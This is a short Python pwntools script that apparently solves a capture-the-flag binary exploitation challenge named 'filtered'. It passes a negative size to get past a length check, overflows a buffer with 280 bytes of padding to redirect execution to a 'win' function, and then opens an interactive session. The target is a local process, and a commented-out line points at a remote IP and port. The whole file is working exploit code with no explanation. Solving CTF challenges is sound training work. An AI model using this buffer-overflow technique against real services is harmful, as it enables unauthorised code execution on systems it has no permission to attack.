from pwn import *


BIN = "./filtered"
win = 0x4011d6
ret = 0x000000000040101a
def exploit():
	payload = b"a"*280 + p64(win)
	# _breakpoint="""
	# 	b*0x401386
	# 	"""
	# gdb.attach(io,_breakpoint)
	io.recvuntil("Size:")
	io.sendline("-1")
	io.recvuntil("Data:")
	io.sendline(payload)
	io.interactive()

io = process(BIN)
#io = remote("167.99.78.201", 9001)
# context.log_level = "debug"
exploit()
